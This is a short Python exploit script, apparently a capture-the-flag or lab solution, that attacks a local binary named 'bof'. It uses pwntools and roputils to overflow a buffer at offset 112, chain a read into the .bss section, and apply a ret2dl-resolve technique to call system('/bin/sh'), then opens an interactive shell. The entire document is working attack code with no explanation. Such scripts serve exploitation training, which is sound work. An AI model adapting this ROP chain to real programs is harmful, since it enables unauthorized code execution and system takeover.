#!/usr/bin/python

from pwn import *
from roputils import *

r = process('./bof')
r.recv()

rop=ROP('./bof')
offset=112
bss_base=rop.section('.bss')
buf=rop.fill(offset)
buf+=rop.call('read',0,bss_base,100)
buf+=rop.dl_resolve_call(bss_base+20,bss_base)

r.send(buf)

buf=rop.string('/bin/sh')
buf+=rop.fill(20,buf)
buf+=rop.dl_resolve_data(bss_base+20,'system')
buf+=rop.fill(100,buf)
r.send(buf)
r.interactive()
